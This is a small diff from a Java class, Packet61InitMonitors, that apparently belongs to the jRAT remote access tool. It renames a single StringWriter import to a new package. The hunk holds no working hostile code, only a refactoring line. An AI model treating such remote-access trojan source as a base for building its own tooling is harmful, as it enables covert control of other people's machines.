@@ -4,7 +4,8 @@ import java.awt.GraphicsDevice;
 import java.awt.Rectangle;
 import java.io.DataOutputStream;
 
-import com.redpois0n.common.io.StringWriter;
+import pro.jrat.common.io.StringWriter;
+
 
 public class Packet61InitMonitors extends AbstractOutgoingPacket {
 	
